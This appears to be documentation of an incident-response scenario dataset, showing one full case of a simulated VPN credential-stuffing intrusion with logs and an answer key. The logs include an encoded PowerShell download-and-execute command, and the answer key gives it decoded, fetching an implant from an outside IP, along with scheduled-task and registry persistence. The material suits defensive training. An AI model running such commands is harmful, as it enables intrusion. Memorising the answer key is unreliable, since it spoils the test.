# data/ — Scenario Data

## Folder Structure

```
data/
├── __init__.py
└── scenarios.json
```

---

## `__init__.py`

```python
# (empty)
```

---

## `scenarios.json`

> **Note:** This file is 793 lines long and contains 10 scenarios (case_101–case_110). The first scenario is shown in full below. The remaining 9 follow the same structure.

### Scenarios Overview

| Case ID  | Goal | Difficulty | Category | Tags |
|----------|------|-----------|----------|------|
| case_101 | Investigate suspicious VPN login and determine if data was exfiltrated | hard | network | vpn, lateral_movement, exfiltration, credential_stuffing |
| case_102 | Determine if the web application has been compromised via SQL injection | medium | appsec | sqli, web, database, exfiltration |
| case_103 | Investigate the ransomware infection and determine the attack vector, blast radius, and recovery path | hard | malware | ransomware, phishing, encryption, persistence, lateral_movement |
| case_104 | Determine if the cloud S3 buckets have been misconfigured and whether sensitive data has been accessed | medium | cloud | aws, s3, misconfiguration, data_exposure, cloud |
| case_105 | Investigate the SSH brute-force attack and determine if the attacker achieved persistent access | easy | network | ssh, brute_force, linux, persistence, cryptominer |
| case_106 | Analyze the insider threat activity and determine what data the employee accessed before termination | medium | incident | insider_threat, data_theft, email, usb, exfiltration |
| case_107 | Investigate the supply chain attack via a compromised npm package | hard | appsec | supply_chain, npm, backdoor, ci_cd, secrets_theft |
| case_108 | Determine if the DNS tunneling activity is being used for data exfiltration | medium | network | dns_tunneling, exfiltration, covert_channel, c2 |
| case_109 | Investigate the privilege escalation on the Kubernetes cluster | hard | cloud | kubernetes, container_escape, privilege_escalation, rbac, cloud |
| case_110 | Investigate the API abuse and determine if customer data was scraped | easy | appsec | api_abuse, scraping, rate_limiting, enumeration, data_exposure |

### Full Example: case_101

```json
[
  {
    "case_id": "case_101",
    "goal": "Investigate suspicious VPN login and determine if data was exfiltrated",
    "difficulty": "hard",
    "category": "network",
    "tags": ["vpn", "lateral_movement", "exfiltration", "credential_stuffing"],
    "created_at": "2025-04-21T00:00:00Z",
    "active": true,

    "environment": {
      "os": "Mixed — Ubuntu 22.04 and Windows Server 2022",
      "network_range": "10.0.0.0/16",
      "assets": [
        { "id": "asset_01", "hostname": "vpn-gw-01",  "ip": "10.0.0.5",  "role": "VPN Gateway",       "os": "Ubuntu 22.04",          "open_ports": [443, 1194] },
        { "id": "asset_02", "hostname": "dc-01",       "ip": "10.0.1.10", "role": "Domain Controller",  "os": "Windows Server 2022",   "open_ports": [53, 88, 389, 445, 3268] },
        { "id": "asset_03", "hostname": "filesvr-01",  "ip": "10.0.1.20", "role": "File Server",        "os": "Windows Server 2019",   "open_ports": [445, 139] }
      ]
    },

    "requirements_file": {
      "path": "requirements.txt",
      "content": [
        "anthropic>=0.25.0", "fastapi>=0.110.0", "tinydb>=4.8.0", "pandas>=2.0.0",
        "pydantic>=2.0.0", "python-dotenv>=1.0.0", "paramiko>=3.4.0", "requests>=2.31.0",
        "PyJWT>=2.8.0", "cryptography>=42.0.0", "uvicorn>=0.29.0", "httpx>=0.27.0"
      ]
    },

    "logs": {
      "auth_logs": [
        { "ts": "2025-04-21T01:52:11Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "admin",        "src_ip": "91.108.4.200",  "country": "RU", "attempt": 1 },
        { "ts": "2025-04-21T01:52:14Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "admin",        "src_ip": "91.108.4.200",  "country": "RU", "attempt": 2 },
        { "ts": "2025-04-21T01:52:18Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "jdoe",         "src_ip": "91.108.4.200",  "country": "RU", "attempt": 3 },
        { "ts": "2025-04-21T01:52:21Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "jdoe",         "src_ip": "91.108.4.200",  "country": "RU", "attempt": 4 },
        { "ts": "2025-04-21T01:52:29Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "svc_backup",   "src_ip": "91.108.4.200",  "country": "RU", "attempt": 5 },
        { "ts": "2025-04-21T01:52:33Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "svc_backup",   "src_ip": "91.108.4.200",  "country": "RU", "attempt": 6 },
        { "ts": "2025-04-21T01:52:41Z", "host": "vpn-gw-01", "event": "AUTH_FAIL",    "user": "administrator","src_ip": "91.108.4.200",  "country": "RU", "attempt": 7 },
        { "ts": "2025-04-21T01:52:49Z", "host": "vpn-gw-01", "event": "AUTH_SUCCESS", "user": "jdoe",         "src_ip": "91.108.4.200",  "country": "RU", "attempt": 8 },
        { "ts": "2025-04-21T01:53:02Z", "host": "vpn-gw-01", "event": "VPN_SESSION",  "user": "jdoe",         "src_ip": "91.108.4.200",  "assigned_ip": "10.0.99.5" },
        { "ts": "2025-04-21T01:55:10Z", "host": "dc-01",     "event": "AUTH_SUCCESS", "user": "jdoe",         "src_ip": "10.0.99.5",     "logon_type": "3" },
        { "ts": "2025-04-21T01:55:44Z", "host": "dc-01",     "event": "LDAP_QUERY",   "user": "jdoe",         "query": "(&(objectClass=user)(memberOf=Domain Admins))" },
        { "ts": "2025-04-21T01:56:01Z", "host": "filesvr-01","event": "AUTH_SUCCESS", "user": "jdoe",         "src_ip": "10.0.99.5",     "logon_type": "3" },
        { "ts": "2025-04-21T01:56:30Z", "host": "filesvr-01","event": "FILE_ACCESS",  "user": "jdoe",         "path": "\\\\filesvr-01\\HR\\salaries_2025.xlsx" },
        { "ts": "2025-04-21T01:56:45Z", "host": "filesvr-01","event": "FILE_ACCESS",  "user": "jdoe",         "path": "\\\\filesvr-01\\Finance\\Q1_report.xlsx" },
        { "ts": "2025-04-21T01:57:10Z", "host": "filesvr-01","event": "BULK_COPY",    "user": "jdoe",         "files_copied": 47, "dest_ip": "91.108.4.200", "bytes": 284000000 },
        { "ts": "2025-04-21T02:01:00Z", "host": "dc-01",     "event": "PROCESS_SPAWN","user": "jdoe",         "parent": "explorer.exe", "child": "powershell.exe", "cmdline": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8ANQA0AC4AMQA5ADgALgAxADAAMgAuADUAOgA4ADAAOAAwAC8AaQBtAHAAbABhAG4AdAAiACkA" },
        { "ts": "2025-04-21T02:01:15Z", "host": "dc-01",     "event": "DNS_QUERY",    "user": "SYSTEM",       "query": "c2panel.exfil-drop.xyz", "resolved": "54.198.102.5" },
        { "ts": "2025-04-21T02:01:20Z", "host": "dc-01",     "event": "NET_CONN",     "user": "SYSTEM",       "dest_ip": "54.198.102.5", "dest_port": 8080, "bytes_out": 1200 }
      ],
      "network_logs": [
        { "ts": "2025-04-21T01:52:00Z", "event": "PORT_SCAN",     "src_ip": "91.108.4.200", "dest_ip": "10.0.0.5",   "ports_scanned": [22, 443, 1194, 3389] },
        { "ts": "2025-04-21T01:53:10Z", "event": "NORMAL_TRAFFIC","src_ip": "10.0.0.15",   "dest_ip": "8.8.8.8",    "bytes": 1200, "protocol": "DNS" },
        { "ts": "2025-04-21T01:54:00Z", "event": "NORMAL_TRAFFIC","src_ip": "10.0.1.5",    "dest_ip": "10.0.1.10",  "bytes": 800,  "protocol": "LDAP" },
        { "ts": "2025-04-21T01:57:10Z", "event": "LARGE_UPLOAD",  "src_ip": "10.0.1.20",   "dest_ip": "91.108.4.200","bytes": 284000000, "duration_sec": 48 },
        { "ts": "2025-04-21T01:58:30Z", "event": "NORMAL_TRAFFIC","src_ip": "10.0.1.8",    "dest_ip": "10.0.1.10",  "bytes": 400,  "protocol": "Kerberos" },
        { "ts": "2025-04-21T02:01:20Z", "event": "C2_BEACON",     "src_ip": "10.0.1.10",   "dest_ip": "54.198.102.5","dest_port": 8080, "interval_sec": 30 },
        { "ts": "2025-04-21T02:02:00Z", "event": "NORMAL_TRAFFIC","src_ip": "10.0.0.22",   "dest_ip": "10.0.1.10",  "bytes": 600,  "protocol": "SMB" }
      ],
      "system_logs": [
        { "ts": "2025-04-21T00:15:00Z", "host": "dc-01",     "event": "NORMAL_LOGIN",   "user": "svc_monitoring", "src_ip": "10.0.0.30" },
        { "ts": "2025-04-21T00:45:00Z", "host": "filesvr-01","event": "NORMAL_LOGIN",   "user": "svc_backup",     "src_ip": "10.0.0.40" },
        { "ts": "2025-04-21T02:01:00Z", "host": "dc-01",     "event": "SCHTASK_CREATE", "task_name": "WindowsUpdateHelper", "run_as": "SYSTEM", "trigger": "every 30 min", "action": "powershell.exe -enc ..." },
        { "ts": "2025-04-21T02:01:05Z", "host": "dc-01",     "event": "REG_WRITE",      "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "updater", "data": "C:\\Windows\\Temp\\svchost32.exe" },
        { "ts": "2025-04-21T02:05:00Z", "host": "dc-01",     "event": "NORMAL_UPDATE",  "process": "WindowsUpdate", "status": "success" }
      ]
    },

    "known_truth": {
      "attack_type": "credential_stuffing + lateral_movement + exfiltration + c2",
      "techniques": [
        { "id": "T1110.004", "name": "Credential Stuffing" },
        { "id": "T1021.002", "name": "SMB Lateral Movement" },
        { "id": "T1059.001", "name": "PowerShell Execution" },
        { "id": "T1053.005", "name": "Scheduled Task Persistence" },
        { "id": "T1547.001", "name": "Registry Run Key Persistence" },
        { "id": "T1048",     "name": "Exfiltration Over Alternative Protocol" },
        { "id": "T1071.001", "name": "C2 over HTTP" }
      ],
      "root_cause": "VPN exposed to internet with no MFA, jdoe account had weak reused password",
      "iocs": {
        "ips": ["91.108.4.200", "54.198.102.5", "185.220.101.12"],
        "domains": ["c2panel.exfil-drop.xyz"],
        "decoded_payload": "IEX (New-Object Net.WebClient).DownloadString(\"http://54.198.102.5:8080/implant\")"
      },
      "blast_radius": "Domain controller compromised, 47 sensitive files exfiltrated, C2 implant with SYSTEM persistence installed on dc-01",
      "correct_immediate_actions": [
        "Isolate dc-01 and filesvr-01 from network",
        "Disable jdoe account immediately",
        "Block 91.108.4.200 and 54.198.102.5 at firewall",
        "Kill scheduled task WindowsUpdateHelper",
        "Remove registry run key HKLM\\...\\Run\\updater",
        "Delete C:\\Windows\\Temp\\svchost32.exe"
      ]
    }
  }
]
```

> The remaining 9 scenarios (case_102–case_110) follow the identical JSON structure with different attack types, logs, environments, and known truths. See [data/scenarios.json](../data/scenarios.json) for the complete file.
